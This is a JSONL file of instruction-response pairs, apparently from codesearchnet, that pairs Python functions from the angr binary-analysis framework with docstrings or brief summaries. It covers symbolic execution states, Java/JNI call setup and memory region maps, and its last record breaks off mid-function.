{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nperform execution with a state. :param state: The state with which to execute :param procedure: An instance of a SimProcedure to run :param ret_to: The address to return to when this procedure is finished :param inline: This is an inline execution. Do not bother copying the state. :param force_addr: Force execution to pretend that we're working at this concrete address :returns: A SimSuccessors object categorizing the execution's successor states", "response": "def process(self, state, procedure,\n            ret_to=None,\n            inline=None,\n            force_addr=None,\n            **kwargs):\n        \"\"\"\n        Perform execution with a state.\n\n        :param state:       The state with which to execute\n        :param procedure:   An instance of a SimProcedure to run\n        :param ret_to:      The address to return to when this procedure is finished\n        :param inline:      This is an inline execution. Do not bother copying the state.\n        :param force_addr:  Force execution to pretend that we're working at this concrete address\n        :returns:           A SimSuccessors object categorizing the execution's successor states\n        \"\"\"\n        return super(SimEngineProcedure, self).process(state, procedure,\n                ret_to=ret_to,\n                inline=inline,\n                force_addr=force_addr)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_default_value(self, state):\n        if self._default_value_generator:\n            return self._default_value_generator(state)\n        else:\n            return state.project.simos.get_default_value_by_type(self.element_type, state=state)", "response": "Get the default value for the array elements."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef add_function(self, func):\n        for block in func.blocks:\n            self.add_obj(block.addr, block)", "response": "Add a function to the blanket."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef dbg_repr(self):\n\n        output = [ ]\n\n        for obj in self.project.loader.all_objects:\n            for section in obj.sections:\n                if section.memsize == 0:\n                    continue\n                min_addr, max_addr = section.min_addr, section.max_addr\n                output.append(\"### Object %s\" % repr(section))\n                output.append(\"### Range %#x-%#x\" % (min_addr, max_addr))\n\n                pos = min_addr\n                while pos < max_addr:\n                    try:\n                        addr, thing = self.floor_item(pos)\n                        output.append(\"%#x: %s\" % (addr, repr(thing)))\n\n                        if thing.size == 0: pos += 1\n                        else: pos += thing.size\n                    except KeyError:\n                        pos += 1\n\n                output.append(\"\")\n\n        return \"\\n\".join(output)", "response": "Returns a string representation of this CFBlanket."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ninitializes CFBlanket from a CFG instance.", "response": "def _from_cfg(self, cfg):\n        \"\"\"\n        Initialize CFBlanket from a CFG instance.\n\n        :param cfg: A CFG instance.\n        :return:    None\n        \"\"\"\n\n        # Let's first add all functions first\n        for func in cfg.kb.functions.values():\n            self.add_function(func)\n\n        self._mark_unknowns()"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _mark_unknowns(self):\n\n        for obj in self.project.loader.all_objects:\n            if isinstance(obj, cle.ELF):\n                # sections?\n                if obj.sections:\n                    for section in obj.sections:\n                        if not section.memsize or not section.vaddr:\n                            continue\n                        min_addr, max_addr = section.min_addr, section.max_addr\n                        self._mark_unknowns_core(min_addr, max_addr + 1, obj=obj, section=section)\n                elif obj.segments:\n                    for segment in obj.segments:\n                        if not segment.memsize:\n                            continue\n                        min_addr, max_addr = segment.min_addr, segment.max_addr\n                        self._mark_unknowns_core(min_addr, max_addr + 1, obj=obj, segment=segment)\n                else:\n                    # is it empty?\n                    _l.warning(\"Empty ELF object %s.\", repr(obj))\n            elif isinstance(obj, cle.PE):\n                if obj.sections:\n                    for section in obj.sections:\n                        if not section.memsize:\n                            continue\n                        min_addr, max_addr = section.min_addr, section.max_addr\n                        self._mark_unknowns_core(min_addr, max_addr + 1, obj=obj, section=section)\n                else:\n                    # is it empty?\n                    _l.warning(\"Empty PE object %s.\", repr(obj))\n            else:\n                min_addr, max_addr = obj.min_addr, obj.max_addr\n                self._mark_unknowns_core(min_addr, max_addr + 1, obj=obj)", "response": "Mark all unmapped regions."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a SimState object with the CGC state blanking all of the state information.", "response": "def state_blank(self, flag_page=None, **kwargs):\n        \"\"\"\n        :param flag_page:   Flag page content, either a string or a list of BV8s\n        \"\"\"\n        s = super(SimCGC, self).state_blank(**kwargs)  # pylint:disable=invalid-name\n\n        # Special stack base for CGC binaries to work with Shellphish CRS\n        s.regs.sp = 0xbaaaaffc\n\n        # Map the special cgc memory\n        if o.ABSTRACT_MEMORY not in s.options:\n            s.memory.mem._preapproved_stack = IRange(0xbaaab000 - 1024 * 1024 * 8, 0xbaaab000)\n            s.memory.map_region(0x4347c000, 4096, 1)\n\n        # Create the CGC plugin\n        s.get_plugin('cgc')\n\n        # Set up the flag page\n        if flag_page is None:\n            flag_page = [s.solver.BVS(\"cgc-flag-byte-%d\" % i, 8, key=('flag', i), eternal=True) for i in range(0x1000)]\n        elif type(flag_page) is bytes:\n            flag_page = [s.solver.BVV(c, 8) for c in flag_page]\n        elif type(flag_page) is list:\n            pass\n        else:\n            raise ValueError(\"Bad flag page: expected None, bytestring, or list, but got %s\" % type(flag_page))\n\n        s.cgc.flag_bytes = flag_page\n        if s.mode != 'static':\n            s.memory.store(0x4347c000, claripy.Concat(*s.cgc.flag_bytes), priv=True)\n\n        # set up the address for concrete transmits\n        s.unicorn.transmit_addr = self.syscall_from_number(2).addr\n\n        s.libc.max_str_len = 1000000\n        s.libc.max_strtol_len = 10\n        s.libc.max_memcpy_size = 0x100000\n        s.libc.max_buffer_size = 0x100000\n\n        return s"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _stmt_inside_loop(self, stmt_idx):\n\n        # TODO: This is slow. Fix the performance issue\n\n        for node in self.loop.body_nodes:\n            if node.addr.stmt_idx <= stmt_idx < node.addr.stmt_idx + node.size:\n                return True\n        return False", "response": "Test whether a statement is inside the loop body or not."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _is_bounded_iterator_based(self):\n\n        # Condition 0\n        check_0 = lambda cond: (isinstance(cond, Condition) and\n                                cond.op == Condition.Equal and\n                                cond.val1 == 0 and\n                                isinstance(cond.val0, AnnotatedVariable) and\n                                cond.val0.type == VariableTypes.HasNext\n                                )\n\n        check_0_results = [ (check_0(stmt[0]), stmt[0]) for stmt in self.loop_exit_stmts ]\n        check_0_conds = [ cond for r, cond in check_0_results if r ]  # remove all False ones\n\n        if not check_0_conds:\n            return None\n\n        the_iterator = check_0_conds[0].val0.variable\n\n        # Condition 1\n        check_1 = lambda local: (isinstance(local, AnnotatedVariable) and\n                                 local.type == VariableTypes.Next and\n                                 local.variable == the_iterator\n                                 )\n\n        if not any([ check_1(local) for local in self.locals.values() ]):\n            return None\n\n        return True", "response": "Check if the iterator based check."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nkills existing definitions w. r. t atom with a dummy definition instance.", "response": "def kill_definitions(self, atom, code_loc, data=None, dummy=True):\n        \"\"\"\n        Overwrite existing definitions w.r.t 'atom' with a dummy definition instance. A dummy definition will not be\n        removed during simplification.\n\n        :param Atom atom:\n        :param CodeLocation code_loc:\n        :param object data:\n        :return: None\n        \"\"\"\n\n        if data is None:\n            data = DataSet(Undefined(atom.size), atom.size)\n\n        self.kill_and_add_definition(atom, code_loc, data, dummy=dummy)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates an entry state.", "response": "def state_entry(self, args=None, **kwargs): # pylint: disable=arguments-differ\n        \"\"\"\n        Create an entry state.\n\n        :param args: List of SootArgument values (optional).\n        \"\"\"\n        state = self.state_blank(**kwargs)\n        # for the Java main method `public static main(String[] args)`,\n        # we add symbolic cmdline arguments\n        if not args and state.addr.method.name == 'main' and \\\n                        state.addr.method.params[0] == 'java.lang.String[]':\n            cmd_line_args = SimSootExpr_NewArray.new_array(state, \"java.lang.String\", BVS('argc', 32))\n            cmd_line_args.add_default_value_generator(self.generate_symbolic_cmd_line_arg)\n            args = [SootArgument(cmd_line_args, \"java.lang.String[]\")]\n            # for referencing the Java array, we need to know the array reference\n            # => saves it in the globals dict\n            state.globals['cmd_line_args'] = cmd_line_args\n        # setup arguments\n        SimEngineSoot.setup_arguments(state, args)\n        return state"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngenerates a new symbolic cmd line argument string.", "response": "def generate_symbolic_cmd_line_arg(state, max_length=1000):\n        \"\"\"\n        Generates a new symbolic cmd line argument string.\n        :return: The string reference.\n        \"\"\"\n        str_ref = SimSootValue_StringRef(state.memory.get_new_uuid())\n        str_sym = StringS(\"cmd_line_arg\", max_length)\n        state.solver.add(str_sym != StringV(\"\"))\n        state.memory.store(str_ref, str_sym)\n        return str_ref"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncreates a native or java call state.", "response": "def state_call(self, addr, *args, **kwargs):\n        \"\"\"\n        Create a native or a Java call state.\n\n        :param addr:    Soot or native addr of the invoke target.\n        :param args:   List of SootArgument values.\n        \"\"\"\n        state = kwargs.pop('base_state', None)\n        # check if we need to setup a native or a java callsite\n        if isinstance(addr, SootAddressDescriptor):\n            # JAVA CALLSITE\n            # ret addr precedence: ret_addr kwarg > base_state.addr > terminator\n            ret_addr = kwargs.pop('ret_addr', state.addr if state else SootAddressTerminator())\n            cc = kwargs.pop('cc', SimCCSoot(self.arch))\n            if state is None:\n                state = self.state_blank(addr=addr, **kwargs)\n            else:\n                state = state.copy()\n                state.regs.ip = addr\n            cc.setup_callsite(state, ret_addr, args)\n            return state\n\n        else:\n            # NATIVE CALLSITE\n            # setup native argument values\n            native_arg_values = []\n            for arg in args:\n                if arg.type in ArchSoot.primitive_types or \\\n                   arg.type == \"JNIEnv\":\n                    # the value of primitive types and the JNIEnv pointer\n                    # are just getting copied into the native memory\n                    native_arg_value = arg.value\n                    if self.arch.bits == 32 and arg.type == \"long\":\n                        # On 32 bit architecture, long values (w/ 64 bit) are copied\n                        # as two 32 bit integer\n                        # TODO is this correct?\n                        upper = native_arg_value.get_bytes(0, 4)\n                        lower = native_arg_value.get_bytes(4, 4)\n                        idx = args.index(arg)\n                        args = args[:idx] \\\n                               + (SootArgument(upper, 'int'), SootArgument(lower, 'int')) \\\n                               + args[idx+1:]\n                        native_arg_values += [upper, lower]\n                        continue\n                else:\n                    # argument has a relative type\n                    # => map Java reference to an opaque reference, which the native code\n                    #    can use to access the Java object through the JNI interface\n                    native_arg_value = state.jni_references.create_new_reference(obj=arg.value)\n                native_arg_values += [native_arg_value]\n\n            # setup native return type\n            ret_type = kwargs.pop('ret_type')\n            native_ret_type = self.get_native_type(ret_type)\n\n            # setup function prototype, so the SimCC know how to init the callsite\n            arg_types = [self.get_native_type(arg.type) for arg in args]\n            prototype = SimTypeFunction(args=arg_types, returnty=native_ret_type)\n            native_cc = self.get_native_cc(func_ty=prototype)\n\n            # setup native invoke state\n            return self.native_simos.state_call(addr, *native_arg_values,\n                                                base_state=state,\n                                                ret_addr=self.native_return_hook_addr,\n                                                cc=native_cc, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_default_value_by_type(type_, state=None):\n        if type_ in ['byte', 'char', 'short', 'int', 'boolean']:\n            return BVS('default_value_{}'.format(type_), 32)\n        elif type_ == \"long\":\n            return BVS('default_value_{}'.format(type_), 64)\n        elif type_ == 'float':\n            return FPS('default_value_{}'.format(type_), FSORT_FLOAT)\n        elif type_ == 'double':\n            return FPS('default_value_{}'.format(type_), FSORT_DOUBLE)\n        elif state is not None:\n            if type_ == 'java.lang.String':\n                return SimSootValue_StringRef.new_string(state, StringS('default_value_{}'.format(type_), 1000))\n            if type_.endswith('[][]'):\n                raise NotImplementedError\n                # multiarray = SimSootExpr_NewMultiArray.new_array(self.state, element_type, size)\n                # multiarray.add_default_value_generator(lambda s: SimSootExpr_NewMultiArray._generate_inner_array(s, element_type, sizes))\n                # return  multiarray\n            elif type_.endswith('[]'):\n                array = SimSootExpr_NewArray.new_array(state, type_[:-2], BVV(2, 32))\n                return array\n            else:\n                return SimSootValue_ThisRef.new_object(state, type_, symbolic=True, init_object=False)\n        else:\n            # not a primitive type\n            # => treat it as a reference\n            return SootNullConstant()", "response": "This method returns the default value for a given type."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncasting the value of primtive types to the specified type.", "response": "def cast_primitive(state, value, to_type):\n        \"\"\"\n        Cast the value of primtive types.\n\n        :param value:       Bitvector storing the primitive value.\n        :param to_type:     Name of the targeted type.\n        :return:            Resized value.\n        \"\"\"\n        if to_type in ['float', 'double']:\n            if value.symbolic:\n                # TODO extend support for floating point types\n                l.warning('No support for symbolic floating-point arguments.'\n                          'Value gets concretized.')\n            value = float(state.solver.eval(value))\n            sort = FSORT_FLOAT if to_type == 'float' else FSORT_DOUBLE\n            return FPV(value, sort)\n\n        elif to_type == 'int' and isinstance(value, FP):\n            # TODO fix fpToIEEEBV in claripty\n            l.warning('Converting FP to BV might provide incorrect results.')\n            return fpToIEEEBV(value)[63:32]\n\n        elif to_type == 'long' and isinstance(value, FP):\n            # TODO fix fpToIEEEBV in claripty\n            l.warning('Converting FP to BV might provide incorrect results.')\n            return fpToIEEEBV(value)\n\n        else:\n            # lookup the type size and extract value\n            value_size = ArchSoot.sizeof[to_type]\n            value_extracted = value.reversed.get_bytes(index=0, size=value_size//8).reversed\n\n            # determine size of Soot bitvector and resize bitvector\n            # Note: smaller types than int's are stored in a 32-bit BV\n            value_soot_size = value_size if value_size >= 32 else 32\n            if to_type in ['char', 'boolean']:\n                # unsigned extend\n                return value_extracted.zero_extend(value_soot_size-value_extracted.size())\n            # signed extend\n            return value_extracted.sign_extend(value_soot_size-value_extracted.size())"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef init_static_field(state, field_class_name, field_name, field_type):\n        field_ref = SimSootValue_StaticFieldRef.get_ref(state, field_class_name,\n                                                        field_name, field_type)\n        field_val = SimSootValue_ThisRef.new_object(state, field_type)\n        state.memory.store(field_ref, field_val)", "response": "Initialize the static field with an allocated but not initialized object of the given type."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nget the address of the implementation from a native declared Java function.", "response": "def get_addr_of_native_method(self, soot_method):\n        \"\"\"\n        Get address of the implementation from a native declared Java function.\n\n        :param soot_method: Method descriptor of a native declared function.\n        :return: CLE address of the given method.\n        \"\"\"\n        for name, symbol in self.native_symbols.items():\n            if soot_method.matches_with_native_name(native_method=name):\n                l.debug(\"Found native symbol '%s' @ %x matching Soot method '%s'\",\n                        name, symbol.rebased_addr, soot_method)\n                return symbol.rebased_addr\n\n        native_symbols = \"\\n\".join(self.native_symbols.keys())\n        l.warning(\"No native method found that matches the Soot method '%s'. \"\n                  \"Skipping statement.\", soot_method.name)\n        l.debug(\"Available symbols (prefix + encoded class path + encoded method \"\n                \"name):\\n%s\", native_symbols)\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nmaps the Java type to a SimTypeReg representation of its native .", "response": "def get_native_type(self, java_type):\n        \"\"\"\n        Maps the Java type to a SimTypeReg representation of its native\n        counterpart. This type can be used to indicate the (well-defined) size\n        of native JNI types.\n\n        :return: A SymTypeReg with the JNI size of the given type.\n        \"\"\"\n        if java_type in ArchSoot.sizeof.keys():\n            jni_type_size = ArchSoot.sizeof[java_type]\n        else:\n            # if it's not a primitive type, we treat it as a reference\n            jni_type_size = self.native_simos.arch.bits\n        return SimTypeReg(size=jni_type_size)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the SimCC object for the native simos. .", "response": "def get_native_cc(self, func_ty=None):\n        \"\"\"\n        :return: SimCC object for the native simos.\n        \"\"\"\n        native_cc_cls = DEFAULT_CC[self.native_simos.arch.name]\n        return native_cc_cls(self.native_simos.arch, func_ty=func_ty)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nfill the class with constrained symbolic values.", "response": "def fill_symbolic(self):\n        \"\"\"\n        Fill the class with constrained symbolic values.\n        \"\"\"\n        self.wYear = self.state.solver.BVS('cur_year', 16, key=('api', 'GetLocalTime', 'cur_year'))\n        self.wMonth = self.state.solver.BVS('cur_month', 16, key=('api', 'GetLocalTime', 'cur_month'))\n        self.wDayOfWeek = self.state.solver.BVS('cur_dayofweek', 16, key=('api', 'GetLocalTime', 'cur_dayofweek'))\n        self.wDay = self.state.solver.BVS('cur_day', 16, key=('api', 'GetLocalTime', 'cur_day'))\n        self.wHour = self.state.solver.BVS('cur_hour', 16, key=('api', 'GetLocalTime', 'cur_hour'))\n        self.wMinute = self.state.solver.BVS('cur_minute', 16, key=('api', 'GetLocalTime', 'cur_minute'))\n        self.wSecond = self.state.solver.BVS('cur_second', 16, key=('api', 'GetLocalTime', 'cur_second'))\n        self.wMilliseconds = self.state.solver.BVS('cur_millisecond', 16, key=('api', 'GetLocalTime', 'cur_millisecond'))\n\n        self.state.add_constraints(self.wYear >= 1601)\n        self.state.add_constraints(self.wYear <= 30827)\n        self.state.add_constraints(self.wMonth >= 1)\n        self.state.add_constraints(self.wMonth <= 12)\n        self.state.add_constraints(self.wDayOfWeek <= 6)\n        self.state.add_constraints(self.wDay >= 1)\n        self.state.add_constraints(self.wDay <= 31)\n        self.state.add_constraints(self.wHour <= 23)\n        self.state.add_constraints(self.wMinute <= 59)\n        self.state.add_constraints(self.wSecond <= 59)\n        self.state.add_constraints(self.wMilliseconds <= 999)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nfills the class with the appropriate values extracted from the given timestamp.", "response": "def fill_from_timestamp(self, ts):\n        \"\"\"\n        Fill the class with the appropriate values extracted from the given timestamp.\n\n        :param ts:  A POSIX timestamp.\n        \"\"\"\n        dt = datetime.datetime.fromtimestamp(ts)\n        self.wYear = dt.year\n        self.wMonth = dt.month\n        self.wDayOfWeek = dt.isoweekday() % 7 # :/\n        self.wDay = dt.day\n        self.wHour = dt.hour\n        self.wMinute = dt.minute\n        self.wSecond = dt.second\n        self.wMilliseconds = dt.microsecond // 1000"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef from_digraph(self, digraph):\n\n        for n1 in digraph.nodes():\n            addr1, stmt_idx1 = n1\n            self.add_statements_to_whitelist(addr1, (stmt_idx1,))\n\n            successors = digraph[n1]\n            for n2 in successors:\n                addr2, stmt_idx2 = n2\n\n                if addr1 != addr2:\n                    # There is a control flow transition from block `addr1` to block `addr2`\n                    self.add_exit_to_whitelist(addr1, addr2)\n\n                self.add_statements_to_whitelist(addr2, (stmt_idx2,))", "response": "Initialize this AnnotatedCFG object from a networkx. DiGraph."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_whitelisted_statements(self, addr):\n        if addr in self._run_statement_whitelist:\n            if self._run_statement_whitelist[addr] is True:\n                return None # This is the default value used to say\n                            # we execute all statements in this basic block. A\n                            # little weird...\n\n            else:\n                return self._run_statement_whitelist[addr]\n\n        else:\n            return []", "response": "Returns a list of statements that are whitelisted for the given address."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef dbg_print_irsb(self, irsb_addr, project=None):\n\n        if project is None:\n            project = self._project\n\n        if project is None:\n            raise Exception(\"Dict addr_to_run is empty. \" + \\\n                            \"Give me a project, and I'll recreate the IRSBs for you.\")\n        else:\n            vex_block = project.factory.block(irsb_addr).vex\n\n        statements = vex_block.statements\n        whitelist = self.get_whitelisted_statements(irsb_addr)\n        for i in range(0, len(statements)):\n            if whitelist is True or i in whitelist:\n                line = \"+\"\n            else:\n                line = \"-\"\n            line += \"[% 3d] \" % i\n            # We cannot get data returned by pp(). WTF?\n            print(line, end='')\n            statements[i].pp()", "response": "Pretty - print an IRSB with whitelist information."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning True if the path should be kept False otherwise.", "response": "def keep_path(self, path):\n        \"\"\"\n        Given a path, returns True if the path should be kept, False if it should be cut.\n        \"\"\"\n        if len(path.addr_trace) < 2:\n            return True\n\n        return self.should_take_exit(path.addr_trace[-2], path.addr_trace[-1])"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef successor_func(self, path):\n\n        whitelist = self.get_whitelisted_statements(path.addr)\n        last_stmt = self.get_last_statement_index(path.addr)\n\n        # pass in those arguments\n        successors = path.step(\n            stmt_whitelist=whitelist,\n            last_stmt=None\n        )\n\n        # further filter successors based on the annotated CFG\n        taken_successors = [ ]\n        for suc in successors:\n            try:\n                taken = self.should_take_exit(path.addr, suc.addr)\n            except AngrExitError:\n                l.debug(\"Got an unknown exit that AnnotatedCFG does not know about: %#x -> %#x\", path.addr, suc.addr)\n                continue\n\n            if taken:\n                taken_successors.append(suc)\n\n        return taken_successors", "response": "This is the callback routine that takes in a path and returns all feasible successors to path group. It returns a list of all feasible successors to path group."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef to_valueset(self, state):\n        return state.solver.VS(state.arch.bits, self.region, self.region_base_addr, self.address)", "response": "Convert the current object into a ValueSet."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nadding a mapping between an absolute address and a region ID.", "response": "def map(self, absolute_address, region_id, related_function_address=None):\n        \"\"\"\n        Add a mapping between an absolute address and a region ID. If this is a stack region map, all stack regions\n        beyond (lower than) this newly added regions will be discarded.\n\n        :param absolute_address:            An absolute memory address.\n        :param region_id:                   ID of the memory region.\n        :param related_function_address:    A related function address, mostly used for stack regions.\n        \"\"\"\n\n        if self.is_stack:\n            # Sanity check\n            if not region_id.startswith('stack_'):\n                raise SimRegionMapError('Received a non-stack memory ID \"%d\" in a stack region map' % region_id)\n\n            # Remove all stack regions that are lower than the one to add\n            while True:\n                try:\n                    addr = next(self._address_to_region_id.irange(maximum=absolute_address, reverse=True))\n                    descriptor = self._address_to_region_id[addr]\n                    # Remove this mapping\n                    del self._address_to_region_id[addr]\n                    # Remove this region ID from the other mapping\n                    del self._region_id_to_address[descriptor.region_id]\n                except StopIteration:\n                    break\n\n        else:\n            if absolute_address in self._address_to_region_id:\n                descriptor = self._address_to_region_id[absolute_address]\n                # Remove this mapping\n                del self._address_to_region_id[absolute_address]\n                del self._region_id_to_address[descriptor.region_id]\n\n        # Add this new region mapping\n        desc = RegionDescriptor(\n            region_id,\n            absolute_address,\n            related_function_address=related_function_address\n        )\n\n        self._address_to_region_id[absolute_address] = desc\n        self._region_id_to_address[region_id] = desc"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nremoving a mapping based on its absolute address.", "response": "def unmap_by_address(self, absolute_address):\n        \"\"\"\n        Removes a mapping based on its absolute address.\n\n        :param absolute_address: An absolute address\n        \"\"\"\n\n        desc = self._address_to_region_id[absolute_address]\n        del self._address_to_region_id[absolute_address]\n        del self._region_id_to_address[desc.region_id]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef absolutize(self, region_id, relative_address):\n\n        if region_id == 'global':\n            # The global region always bases 0\n            return relative_address\n\n        if region_id not in self._region_id_to_address:\n            raise SimRegionMapError('Non-existent region ID \"%s\"' % region_id)\n\n        base_address = self._region_id_to_address[region_id].base_address\n        return base_address + relative_address", "response": "Converts a relative address in some memory region to an absolute address."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconvert an absolute address to the memory offset in a memory region. Note that if an address belongs to heap region is passed in to a stack region map, it will be converted to an offset included in the closest stack frame, and vice versa for passing a stack address to a heap region. Therefore you should only pass in address that belongs to the same category (stack or non-stack) of this region map. :param absolute_address: An absolute memory address :return: A tuple of the closest region ID, the relative offset, and the related function address.", "response": "def relativize(self, absolute_address, target_region_id=None):\n        \"\"\"\n        Convert an absolute address to the memory offset in a memory region.\n\n        Note that if an address belongs to heap region is passed in to a stack region map, it will be converted to an\n        offset included in the closest stack frame, and vice versa for passing a stack address to a heap region.\n        Therefore you should only pass in address that belongs to the same category (stack or non-stack) of this region\n        map.\n\n        :param absolute_address:    An absolute memory address\n        :return:                    A tuple of the closest region ID, the relative offset, and the related function\n                                    address.\n        \"\"\"\n\n        if target_region_id is None:\n            if self.is_stack:\n                # Get the base address of the stack frame it belongs to\n                base_address = next(self._address_to_region_id.irange(minimum=absolute_address, reverse=False))\n\n            else:\n                try:\n                    base_address = next(self._address_to_region_id.irange(maximum=absolute_address, reverse=True))\n\n                except StopIteration:\n                    # Not found. It belongs to the global region then.\n                    return 'global', absolute_address, None\n\n            descriptor = self._address_to_region_id[base_address]\n\n        else:\n            if target_region_id == 'global':\n                # Just return the absolute address\n                return 'global', absolute_address, None\n\n            if target_region_id not in self._region_id_to_address:\n                raise SimRegionMapError('Trying to relativize to a non-existent region \"%s\"' % target_region_id)\n\n            descriptor = self._region_id_to_address[target_region_id]\n            base_address = descriptor.base_address\n\n        return descriptor.region_id, absolute_address - base_address, descriptor.related_function_address"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the category of this memory instance.", "response": "def category(self):\n        \"\"\"\n        Return the category of this SimMemory instance. It can be one of the three following categories: reg, mem,\n        or file.\n        \"\"\"\n\n        if self.id in ('reg', 'mem'):\n            return self.id\n\n        elif self._abstract_backer:\n            return 'mem'\n\n        elif self.id.startswith('file'):\n            return 'file'\n\n        else:\n            raise SimMemoryError('Unknown SimMemory category for memory_id \"%s\"' % self.id)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsetting the state of the current instance of the class.", "response": "def set_state(self, state):\n        \"\"\"\n        Call the set_state method in SimStatePlugin class, and then perform the delayed initialization.\n\n        :param state: The SimState instance\n        \"\"\"\n        SimStatePlugin.set_state(self, state)\n\n        # Delayed initialization\n        stack_region_map, generic_region_map = self._temp_stack_region_map, self._temp_generic_region_map\n\n        if stack_region_map or generic_region_map:\n            # Inherited from its parent\n            self._stack_region_map = stack_region_map.copy()\n            self._generic_region_map = generic_region_map.copy()\n\n        else:\n            if not self._abstract_backer and o.REGION_MAPPING in self.state.options:\n                # Only the top-level SimMemory instance can have region maps.\n                self._stack_region_map = RegionMap(True)\n                self._generic_region_map = RegionMap(False)\n\n            else:\n                self._stack_region_map = None\n                self._generic_region_map = None"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nconvert a string into an AST.", "response": "def _convert_to_ast(self, data_e, size_e=None):\n        \"\"\"\n        Make an AST out of concrete @data_e\n        \"\"\"\n        if type(data_e) is bytes:\n            # Convert the string into a BVV, *regardless of endness*\n            bits = len(data_e) * self.state.arch.byte_width\n            data_e = self.state.solver.BVV(data_e, bits)\n        elif type(data_e) is int:\n            data_e = self.state.solver.BVV(data_e, size_e*self.state.arch.byte_width if size_e is not None\n                                       else self.state.arch.bits)\n        else:\n            data_e = data_e.raw_to_bv()\n\n        return data_e"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef set_stack_address_mapping(self, absolute_address, region_id, related_function_address=None):\n        if self._stack_region_map is None:\n            raise SimMemoryError('Stack region map is not initialized.')\n        self._stack_region_map.map(absolute_address, region_id, related_function_address=related_function_address)", "response": "Create a new mapping between an absolute address and a specific region ID."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef unset_stack_address_mapping(self, absolute_address):\n        if self._stack_region_map is None:\n            raise SimMemoryError('Stack region map is not initialized.')\n        self._stack_region_map.unmap_by_address(absolute_address)", "response": "Removes a stack mapping."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef stack_id(self, function_address):\n        region_id = 'stack_0x%x' % function_address\n\n        # deduplication\n        region_ids = self._stack_region_map.region_ids\n        if region_id not in region_ids:\n            return region_id\n        else:\n            for i in range(0, 2000):\n                new_region_id = region_id + '_%d' % i\n                if new_region_id not in region_ids:\n                    return new_region_id\n            raise SimMemoryError('Cannot allocate region ID for function %#08x - recursion too deep' % function_address)", "response": "Return a memory region ID for a function."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef store(self, addr, data, size=None, condition=None, add_constraints=None, endness=None, action=None,\n              inspect=True, priv=None, disable_actions=False):\n        \"\"\"\n        Stores content into memory.\n\n        :param addr:        A claripy expression representing the address to store at.\n        :param data:        The data to store (claripy expression or something convertable to a claripy expression).\n        :param size:        A claripy expression representing the size of the data to store.\n\n        The following parameters are optional.\n\n        :param condition:       A claripy expression representing a condition if the store is conditional.\n        :param add_constraints: Add constraints resulting from the merge (default: True).\n        :param endness:         The endianness for the data.\n        :param action:          A SimActionData to fill out with the final written value and constraints.\n        :param bool inspect:    Whether this store should trigger SimInspect breakpoints or not.\n        :param bool disable_actions: Whether this store should avoid creating SimActions or not. When set to False,\n                                     state options are respected.\n        \"\"\"\n\n        _inspect = inspect and self.state.supports_inspect\n\n        if priv is not None: self.state.scratch.push_priv(priv)\n\n        addr_e = _raw_ast(addr)\n        data_e = _raw_ast(data)\n        size_e = _raw_ast(size)\n        condition_e = _raw_ast(condition)\n        add_constraints = True if add_constraints is None else add_constraints\n\n        if isinstance(addr, str):\n            named_addr, named_size = self._resolve_location_name(addr, is_write=True)\n            addr = named_addr\n            addr_e = addr\n            if size is None:\n                size = named_size\n                size_e = size\n\n        if isinstance(data_e, str):\n            data_e = data_e.encode()\n            l.warning(\"Storing unicode string encoded as utf-8. Did you mean to use a bytestring?\")\n\n        # store everything as a BV\n        data_e = self._convert_to_ast(data_e, size_e if isinstance(size_e, int) else None)\n\n        # zero extend if size is greater than len(data_e)\n        stored_size = size_e*self.state.arch.byte_width if isinstance(size_e, int) else self.state.arch.bits\n        if size_e is not None and self.category == 'reg' and len(data_e) < stored_size:\n            data_e = data_e.zero_extend(stored_size - len(data_e))\n\n        if type(size_e) is int:\n            size_e = 